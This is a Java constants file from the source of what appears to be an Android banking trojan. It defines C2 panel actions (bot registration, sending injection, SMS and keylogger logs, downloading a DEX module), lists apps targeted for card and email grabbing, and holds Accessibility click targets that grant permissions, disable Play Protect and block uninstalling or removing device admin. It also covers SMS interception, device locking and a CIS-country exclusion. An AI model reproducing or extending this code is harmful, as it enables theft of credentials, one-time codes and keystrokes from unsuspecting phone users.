package com.example.mmm;

import android.util.Base64;

import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvNetworkConnect;
import com.example.mmm.Service.srvPedometer;
import com.example.mmm.Service.srvWhileWorker;


public class constants {
    public String decrypt_str(String textDE_C){
        try {
            return new String(new ClassRC4(textDE_C.substring(0,12).getBytes()).decrypt(hexStringToByteArray(new String(Base64.decode(textDE_C.substring(12), Base64.DEFAULT), "UTF-8"))));
        }catch (Exception ex){ }
        return "";
    }
    public   byte[] hexStringToByteArray(String s){
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    public String base64Decode(String str){
        try{
            byte[] data = Base64.decode(str, Base64.DEFAULT);
            return new String(data, "UTF-8");
        }catch (Exception ex){return "";}
    }

    public  boolean DebugConsole = true;


    //-----Starting Settings--------------------


    public  String idbot = "idbot";
    public  String initialization = "initialization";
    public  String urlAdminPanel = "urlAdminPanel";
    public  String starterService = "starterService";
    public  String statusInstall = "statusInstall";
    public  String kill = "kill";
    public  String killApplication = "killApplication";
    public  String step = "step";
    public  String activityAccessibilityVisible = "activityAccessibilityVisible";
    public  String arrayInjection = "arrayInjection";
    public  String checkupdateInjection = "checkupdateInjection";
    public  String whileStartUpdateInection = "whileStartUpdateInection";
    public  String actionSettingInection = "actionSettingInection";
    public  String listSaveLogsInjection = "listSaveLogsInjection";
    public  String LogSMS = "LogSMS";
    public  String packageNameDefultSmsMenager = "packageNameDefultSmsMenager";
    public  String hiddenSMS = "hiddenSMS";
    public  String idSettings = "idSettings";
    public  String statAdmin = "statAdmin";
    public  String statProtect = "statProtect";
    public  String statScreen = "statScreen";
    public  String statAccessibilty = "statAccessibilty";
    public  String statSMS = "statSMS";
    public  String statCards = "statCards";
    public  String statBanks = "statBanks";
    public  String statMails = "statMails";
    public  String activeDevice = "activeDevice";
    public  String timeWorking = "timeWorking";
    public  String statDownloadModule = "statDownloadModule";
    public  String lockDevice = "lockDevice";
    public  String offSound = "offSound";
    public  String keylogger = "keylogger";
    public  String activeInjection = "activeInjection";
    public  String timeInject = "timeInject";
    public  String timeCC = "timeCC";
    public  String timeMails = "timeMails";
    public  String dataKeylogger = "dataKeylogger";
    public  String autoClick = "autoClick";
    public  String traf_key = "key";
    public  String display_width = "display_width";
    public  String display_height = "display_height";
    public  String checkProtect = "checkProtect";
    public  String goOffProtect = "goOffProtect";
    public  String timeProtect = "timeProtect";
    public  String packageName = "packageName";
    public  String packageNameActivityInject = "packageNameActivityInject";
    public  String logsContacts = "logsContacts";
    public  String logsApplications = "logsApplications";
    public  String logsSavedSMS = "logsSavedSMS";
    public  String locale = "locale";
    public  String batteryLevel = "batteryLevel";
    public  String urls = "urls";
    public  String getPermissionsToSMS = "getPermissionsToSMS";
    public  String startInstalledTeamViewer = "startInstalledTeamViewer";
    public  String day1PermissionSMS = "day1PermissionSMS";
    public  String schetBootReceiver = "schetBootReceiver";
    public  String schetAdmin = "schetAdmin";
    public  String start_admin = "start_admin";
    //------------Constants replace java class------

    public  String str_keyguard = "keyguard"; //idUtils, Utils
    public  String str_power = "power"; //idUtils
    public  String str_phone = "phone"; //idUtils
    public  String str_alarm = "alarm"; //Utils
    public  String str_BATTERY_CHANGED = "android.intent.action.BATTERY_CHANGED";//Utils
    public  String str_level = "level"; //Utils
    public  String str_scale = "scale"; //Utils
    public  String str_activity = "activity"; //Utils
    public  String str_enabled_accessibility_services = "enabled_accessibility_services"; //Utils
    public  String str_device_policy = "device_policy"; //Utils, AdminActivity
    public  String str_ADD_DEVICE_ADMIN = "android.app.action.ADD_DEVICE_ADMIN"; //AdminActivity
    public  String str_DEVICE_ADMIN = "android.app.extra.DEVICE_ADMIN"; //AdminActivity
    public  String str_ADD_EXPLANATION = "android.app.extra.ADD_EXPLANATION"; //AdminActivity
    public  String str_ACCESSIBILITY_SETTINGS = "android.settings.ACCESSIBILITY_SETTINGS"; //actToaskAccessbility
    public  String str_sensor = "sensor"; //srvPedometer


    //--------------Settings Connect Panal---------


    public  boolean blockCIS = false;
    public  String nameFileSettings = "settings";
    public  String tag = ".tag.";
    public  String str_urlAdminPanel = ".urlConnectPanel.";
    public  String strAccessbilityService = ".nameAccessibilityService.";
    public  String key = ".key.";
    public  int startStep = 0;

    public  String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    public  String strREAD_PHONE_STATE = "android.permission.READ_PHONE_STATE";

    public  String[] arrayPermission = {"android.permission.SEND_SMS","android.permission.READ_PHONE_STATE","android.permission.READ_CONTACTS"};


    //--------------
    public  String str_timesp = "timestop";
    public  String strPackage = "package:";
    public  String strTAG1 = " >> ";
    public  String strUTF_8 = "UTF-8";
    public  String str_POST = "POST";
    public  String str_Content_Length = "Content-Length";
    public  String str_good = "good";
    public  String str_step= "0";
    public  String str_null = "";
    public  String str = " ";
    public  String str_1 = "1";
    public  String str_gate = "/gate.php";
    public  String str_qwergasdzxc = "qwertyuiopasdfghjklzxcvbnm1234567890";
    public  String str_dead = "dead";
    public  String str_log1 = "START >> Boot Receiver";
    public  String str_step2= "step";
    public  String str_log2 = "No Doze Mode";
    public  String str_log15 = "-------------------checkAdminPanel-------------------";
    public  String str_http_1 = "action=getinj&data=";
    public  String str_http_2 = "action=injcheck&data=";
    public  String str_http_3 = "action=botcheck&data=";
    public  String str_http_11 = "||no||";
    public  String str_http_12 = "action=registration&data=";
    public  String str_http_16 = "action=sendInjectLogs&data=";
    public  String str_http_17 = "action=sendSmsLogs&data=";
    public  String str_http_18 = "action=timeInject&data=";
    public  String str_http_19 = "action=sendKeylogger&data=";
    public  String str_http_20 = "action=getModule&data=";
    public  String str_http_21 = "action=checkAP&data=";
    public  String str_log16= "Not Yet Implemented";
    public  String nameModule = "system.apk";

    public  String string_1 = "Android";
    public  String string_2 = "text/html";
    public  String string_3 = "Start Accessibility";
    public  String string_4 = "Tooltip: You need enable Accessibility";
    public  String string_5 = "'";
    public  String string_6 = "app";
    public  String string_7 = "name";
    public  String string_8 = "grabCC";
    public  String string_9 = "grabMails";
    public  String string_10 = "var lang = 'en'";
    public  String string_11 = "var lang = '";
    public  String string_12 = "app = 'THISSTRINGREPLACEWITHAPPNAME'";
    public  String string_13 = "app = '";
    public  String string_14 = "'";
    public  String string_15 = "Start View Injection: ";
    public  String string_16 = "ERROR View Injection: ";
    public  String string_17 = "-";
    public  String string_18 = "application";
    public  String string_19 = "data";

    public  String string_20 = base64Decode("LCJleGl0IjoiIg==");
    public  String string_20_ = base64Decode("LCJleGl0IjoidHJ1ZSI=");
    public  String string_21 = "ID: ";
    public  String string_22 = " Logs: ";
    public  String string_23 = ":";
    public  String string_24 = "admin";
    public  String string_25 = "START SERVICE 1: ";
    public  String string_26 = "START SERVICE 2: ";
    public  String string_27_ = "WORKING SERVICE: ";
    public  String string_27 = "Error #1 onAccessibilityEvent";
    public  String string_28 = "click unlock device";
    public  String string_29 = "nodeInfo == null";
    public  String string_30 = "CLICKED: ";
    public  String string_31 = "   X:";
    public  String string_32 = "   Y:";
    public  String string_33 = "packageApp{";
    public  String string_34 = "} strText{";
    public  String string_35 = "} className{";
    public  String string_36 = "}";
    public  String string_37 = "com.android.settings.SubSettings";
    public  String string_38 = "Log Keylogger Size: ";
    public  String string_39 = "com.android.settings:id/action_button";
    public  String string_40 = "android:id/button1";
    public  String string_41 = "com.android.packageinstaller:id/permission_allow_button";
    public  String string_42 = "-=CLICK BUTTON=-";
    public  String string_43 = "com.android.settings:id/action_button";
    public  String string_44 = "com.android.settings:id/left_button";
    public  String string_45 = "com.google.android.packageinstaller";
    public  String string_46 = "android.app.alertdialog";
    public  String string_47 = "android.support.v7.widget.recyclerview";
    public  String string_48 = "android.widget.linearlayout";
    public  String string_48_ = "com.miui.securitycenter";
    public  String string_49 = "com.android.settings";
    public  String string_49_ = "com.miui.securitycenter:id/accept";
    public  String string_50 = "com.android.settings.deviceadminadd";
    public  String string_51 = "ERROR BLOCK";
    public  String string_52 = "MM/dd/yyyy, HH:mm:ss z";
    public  String string_53 = "[Focused]";
    public  String string_54 = "[Click]";
    public  String string_55 = "[Wtore Text]";
    public  String string_56 = ":endlog:";
    public  String string_57 = "params";
    public  String string_58 = "packageAppStart";
    public  String string_59 = "nameInject";
    public  String string_60 = "packageProject";
    public  String string_61 = "packageView";
    public  String string_62 = "startViewInject";
    public  String string_63 = "ERROR Start Injection: ";
    public  String string_64 = " ";
    public  String string_65 = "onInterrupt";
    public  String string_66 = "com.android.vending";
    public  String string_67 = "com.android.vending:id/play_protect_settings";
    public  String string_67_new2 = "com.android.vending:id/toolbar_item_play_protect_settings";
    public  String string_68 = "com.google.android.gms.security.settings.verifyappssettingsactivity";
    public  String string_69 = "android.app.alertdialog";
    public  String string_70 = "onServiceConnected";
    public  String string_71 = "id";
    public  String string_72 = "number";
    public  String string_73 = "ERROR JSON CHECK BOT";
    public  String string_74 = "jsonCheckBot: ";
    public  String string_75 = ",";
    public  String string_76 = "Check URL: ";
    public  String string_77 = "~I~";
    public  String string_78 = "NEW DOMAIN: ";
    public  String string_79 = "ERROR Check URLS";
    public  String string_80 = "EnCryptResponce: ";
    public  String string_81 = "CheckBotRESPONCE: ";
    public  String string_82 = "||youNeedMoreResources||";
    public  String string_83 = "android";
    public  String string_84 = "tag";
    public  String string_85 = "country";
    public  String string_86 = "operator";
    public  String string_87= "model";
    public  String string_88 = "jsonRegistrationBot: ";
    public  String string_89 = "RegistrationRESPONCE: ";
    public  String string_90 = "ok";
    public  String string_91 = "params";
    public  String string_92 = "updateSettingsAndCommands";
    public  String string_93 = "response";
    public  String string_94 = "Tick: ";
    public  String string_95 = "apk";
    public  String string_96 = "serviceWorkingWhile";
    public  String string_97 = "tick";
    public  String string_98 = "accessibility";
    public  String string_99 = "ERROR: module Dex Start";
    public  String string_100 = "-1";
    public  String string_101 = "2";
    public  String string_102 = "downloadModuleDex";
    public  String string_103 = "Download Module: ";
    public  String string_104 = "Save Module";
    public  String string_105 = "ERROR: Work File Module";
    public  String string_106 = "outdex";
    public  String string_107 = "com.example.modulebot.mod";
    public  String string_108 = "main";
    public  String string_109 = "DexClassLoader";
    public  String string_110 = "Error: ";
    public  String string_111 = "getNameApplication";
    public  String string_112 = "Error Method";
    public  String string_113 = "LockDevice";
    public  String string_114 = "ERROR";
    public  String string_115 = "inject";
    public  String string_116 = "pdus";
    public  String string_117 = "Input SMS: ";
    public  String string_118 = " Text:";
    public  String string_119 = "::endLog::";
    public  String string_120 = "sendSMS";
    public  String string_121 = "idinject";
    public  String string_122 = "application";
    public  String string_123 = "logs";
    public  String string_124 = "SEND";
    public  String string_125 = "idinject: ";
    public  String string_126 = "idbot: ";
    public  String string_127 = "application: ";
    public  String string_128 = "logs: ";
    public  String string_129 = "date";
    public  String string_130 = "SEND SMS";
    public  String string_131 = "str_getParams";
    public  String string_132 = "str_params";
    public  String string_133 = "mergedJSON";
    public  String string_134 = "JSON";
    public  String string_135 = "ERROR SettingsToAddJson";
    public  String string_136 = "Initialization Start 1!";
    public  String string_137 = "Initialization Start 2!";
    public  String string_138 = "startpush";
    public  String string_139 = "push";


   // public  String string_140 = "(pro1)  | actDozeMode ";
  //  public  String string_141 = "(pro2)  | actPermissions ";
    public  String string_142 = base64Decode("PGh0bWwgbGFuZz0iZW4iPg==");
    public  String string_143 = base64Decode("PGh0bWwgbGFuZz0i");
    public  String string_144 = base64Decode("Ij4=");
    //public  String string_145 = "(pro3)  | actToaskAccessbility ";
    public  String string_146 = "Inject:";
    //public  String string_147 = "(pro5)  | actViewInjection ";
   // public  String string_148 = "(pro6)  | ActivityAdmin ";
  //  public  String string_149 = "(pro8)  | bootReceiver ";
  //  public  String string_150 = "(pro7)  | bootReceiver ";
  //  public  String string_151 = "(pro10)  | srvLockDevice ";
  //  public  String string_152 = "(pro11)  | srvNetworkConnect ";
  //  public  String string_153 = "(pro12)  | srvNetworkConnect ";
  //  public  String string_154 = "(pro13)  | srvNetworkConnect ";
  //  public  String string_155 = "(pro13)  | srvPedator ";
  //  public  String string_156 = "(pro12)  | srvPedometer";
    public  String string_157 = " # ";
   // public  String string_158 = "(pro32)  | onAccessibilityEvent ";
    // public  String string_159 = "(pro28)  | app_inject onAccessibilityEvent ";
    //public  String string_160 = "(pro28)  | packageAppStart onAccessibilityEvent ";
    //public  String string_161 = "(pro28)  | strText onAccessibilityEvent ";
    //public  String string_162 = "(pro28)  | className onAccessibilityEvent ";
   // public  String string_163 = "(pro29)  | onAccessibilityEvent ";
    public  String string_164 = "BLOCK DISABLE ACCESIBILITY SERVICE";
   // public  String string_165 = "(pro30)  | onAccessibilityEvent ";
   // public  String string_166 = "(pro31)  | protect onAccessibilityEvent ";
    public  String string_167 = "BLOCK DELETE";
    public  String string_168 = "BLOCK DISABLE ADMIN";
 //   public  String string_169 = "(pro31)  | onAccessibilityEvent ";
    public  String string_170 = ".";
   // public  String string_171 = "(pro33)  | onAccessibilityEvent ";
   // public  String string_172 = "(pro35)  | onAccessibilityEvent ";
  //  public  String string_173 = "(pro34)  | onAccessibilityEvent ";
  //  public  String string_174 = "(pro14)  | srvWhileWorker ";
  //  public  String string_175 = "(pro15)  | srvWhileWorker ";
  //  public  String string_176 = "(pro16)  | srvWhileWorker ";
  //  public  String string_177 = "(pro17)  | srvWhileWorker ";
    public  String string_178 = "~no~";
    //public  String string_179 = "(pro18)  | utils ";
  //  public  String string_180 = "(pro19)  | utils JSON ";
  //  public  String string_181 = "(pro20)  | utils downloadModuleDex ";
  //  public  String string_182 = "(pro21)  | utils sendMainModuleDEX ";
  //  public  String string_183 = "(pro21)  | utils getLabelApplication ";
 //   public  String string_184 = "(pro22)  | utils lockDevice ";
  //  public  String string_185 = "(pro23)  | utils timeInjectionsSendPanel ";
   // public  String string_186 = "(pro24)  | utils interceptionSMS ";
   // public  String string_187 = "(pro25)  | utils stopSound ";
  //  public  String string_188 = "(pro26)  | utils checkAP ";
  //  public  String string_189 = "(pro27)  | utils isAccessibilityServiceEnabled ";
    //  public  String string_190 = "(pro11)  | strRAT ";

    public  String listAppGrabCards = "com.android.vending,org.telegram.messenger,com.ubercab,com.whatsapp,com.tencent.mm,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android,";
    public  String listAppGrabMails = "com.google.android.gm,com.mail.mobile.android.mail,com.connectivityapps.hotmail,com.microsoft.office.outlook,com.yahoo.mobile.client.android.mail,";

    public  String localeForAccessibilityEN = "Enable";
    public  String localeForAccessibility =
            "{"+
                    "'en':'Enable'," +
                    "'de':'Aktivieren'," +
                    "'af':'Aktiveer'," +
                    "'zh':'启用'," +
                    "'cs':'Zapnout'," +
                    "'nl':'Activeren'," +
                    "'fr':'Activer'," +
                    "'it':'Abilitare'," +
                    "'ja':'有効にする'," +
                    "'ko':'사용하다'," +
                    "'pl':'włączyć'," +
                    "'es':'Habilitar'," +
                    "'ar':'يُمكّن'," +
                    "'bg':'Възможност'," +
                    "'ca':'Habilitar'," +
                    "'hr':'Aktivirati'," +
                    "'da':'Aktivere'," +
                    "'fi':'Ottaa käyttöön'," +
                    "'el':'ενεργοποιώ'," +
                    "'iw':'הפוך לזמין'," +
                    "'hi':'सक्षम करें'," +
                    "'hu':'Engedélyez'," +
                    "'in':'Fungsikan'," +
                    "'lv':'Aktivizēt'," +
                    "'lt':'Aktyvinti'," +
                    "'nb':'Aktivere'," +
                    "'pt':'Ativar'," +
                    "'ro':'Activa'," +
                    "'sr':'Aktivirati'," +
                    "'sk':'Aktivovať'," +
                    "'sl':'Vključiti'," +
                    "'sv':'Aktivera'," +
                    "'th':'เปิดใช้งาน'," +
                    "'tr':'Etkinleştirmek'," +
                    "'vi':'có hiệu lực'" +
                    "}";
    /*
    public  String localeForContinueEN = "Continue";
    public  String localeForContinue =
            "{"+
                    "'en':'Continue'," +
                    "'de':'Fortsetzen'," +
                    "'af':'Behou'," +
                    "'zh':'继续'," +
                    "'cs':'Pokračovat '," +
                    "'nl':'Voortzetten'," +
                    "'fr':'Continuer'," +
                    "'it':'Continuare'," +
                    "'ja':'続ける'," +
                    "'ko':'계속'," +
                    "'pl':'Kontynuować'," +
                    "'es':'Seguir'," +
                    "'ar':'مواصلة'," +
                    "'bg':'Продължавам'," +
                    "'ca':'Continuar'," +
                    "'hr':'Nastaviti'," +
                    "'da':'Fortsætte'," +
                    "'fi':'Jatkaa'," +
                    "'el':'περαιτέρω'," +
                    "'iw':'להמשיך'," +
                    "'hi':'ऑपरेशन जारी रखें'," +
                    "'hu':'Folytat'," +
                    "'in':'Berlanjut'," +
                    "'lv':'Turpināt'," +
                    "'lt':'Tęsti'," +
                    "'nb':'Fortsette'," +
                    "'pt':'Continuar'," +
                    "'ro':'Continua'," + Сервис работающий в безконечном цикле для выполнений некоторых функций малари
                    "'sr':'Nastaviti'," +
                    "'sk':'Pokračovať'," +
                    "'sl':'Nadaljujemo'," +
                    "'sv':'Fortsätta'," +
                    "'th':'เดินเรื่อง'," +
                    "'tr':'Devam etmek'," +
                    "'vi':'tiếp tục'" +
             "}";
*/


    public  String strCIS = "[ua][ru][by][tj][uz][tm][az][am][kz][kg][md]";

    public  String base64HtmlAccessibilityCusom = "CHANGETHISbase64HtmlAccessibilityCusomCHANGETHIS";

    public  Class[] arrayClassService = {srvNetworkConnect.class, srvPedometer.class,  srvWhileWorker.class};

}

